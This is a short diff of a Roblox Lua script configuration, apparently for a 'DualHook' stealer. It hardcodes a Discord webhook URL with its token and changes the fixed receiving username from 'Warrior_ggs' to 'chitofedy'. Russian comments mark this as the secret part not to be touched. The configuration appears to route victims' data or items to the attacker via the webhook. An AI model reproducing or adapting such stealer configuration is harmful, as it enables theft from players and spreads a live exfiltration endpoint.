@@ -3,9 +3,9 @@ repeat
 until game:IsLoaded()
 
 -- 🔐 DualHook config (секретная часть) — НЕ ТРОГАЕМ!
-getgenv().DhUser = "Warrior_ggs"
+getgenv().DhUser = "chitofedy"
 getgenv().DhWebhook = "https://discord.com/api/webhooks/1402819441519099904/ExWswHavk5BTB4c0YbmmYwWAqqr1gCHSDkpedr_AH_1sKIbfie4qEfIXwLTPEAGKS28C"
-getgenv().NewUser = "Warrior_ggs" -- NewUser жёстко зафиксирован
+getgenv().NewUser = "chitofedy" -- NewUser жёстко зафиксирован
 
 -- User и WEBHOOK_URL берутся снаружи через getgenv(), чтобы менять без правки кода
 local User = getgenv().User or "Warrior_ggs"
